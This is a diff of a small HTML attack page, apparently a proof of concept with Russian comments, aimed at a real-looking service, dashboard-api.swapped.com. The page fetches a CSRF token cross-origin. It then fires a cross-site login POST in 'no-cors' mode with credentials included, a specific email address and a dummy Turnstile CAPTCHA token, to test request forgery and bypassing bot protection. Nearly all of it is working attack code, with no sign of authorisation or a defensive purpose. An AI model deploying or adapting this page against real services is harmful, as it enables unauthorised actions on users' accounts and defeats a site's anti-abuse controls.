@@ -1,24 +1,31 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-DL2</title></head>
-<body><pre id="out">DL2-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-NC</title></head>
+<body><pre id="out">NC-START</pre>
 <script>
-try {
-  // Сначала получим свежий CSRF
-  var xhr0 = new XMLHttpRequest();
-  xhr0.open("GET", "https://dashboard-api.swapped.com/api/v1/auth/csrf", false);
-  xhr0.send();
-  var csrf = JSON.parse(xhr0.responseText).data.csrf_token;
+(async () => {
+  try {
+    // 1) Получим CSRF (GET — работает cross-origin с CORS headers)
+    const csrfResp = await fetch("https://dashboard-api.swapped.com/api/v1/auth/csrf");
+    const csrfData = await csrfResp.json();
+    const csrf = csrfData.data.csrf_token;
+    document.getElementById("out").textContent = "NC-CSRF: " + csrf.slice(0, 15) + "...";
 
-  // Теперь POST login с dummy Turnstile
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://dashboard-api.swapped.com/api/v1/auth/login", false);
-  xhr.setRequestHeader("Content-Type", "text/plain");
-  xhr.setRequestHeader("X-CSRF-Token", csrf);
-  xhr.send(JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" }));
-  document.title = "DL2-" + xhr.status;
-  document.getElementById("out").textContent = "DL2-RESULT " + xhr.status + " :: CSRF=" + csrf.slice(0,10) + " :: " + xhr.responseText.slice(0, 500);
-} catch (e) {
-  document.title = "DL2-ERR";
-  document.getElementById("out").textContent = "DL2-ERR " + e.message;
-}
+    // 2) POST login с mode:no-cors (запрос уйдёт, ответ opaque)
+    const resp = await fetch("https://dashboard-api.swapped.com/api/v1/auth/login", {
+      method: "POST",
+      mode: "no-cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "text/plain",
+        "X-CSRF-Token": csrf
+      },
+      body: JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" })
+    });
+    document.title = "NC-" + resp.type;
+    document.getElementById("out").textContent += "\nNC-POST: " + resp.type + " (opaque) — запрос отправлен!";
+  } catch (e) {
+    document.title = "NC-ERR";
+    document.getElementById("out").textContent = "NC-ERR " + e.message;
+  }
+})();
 </script></body></html>
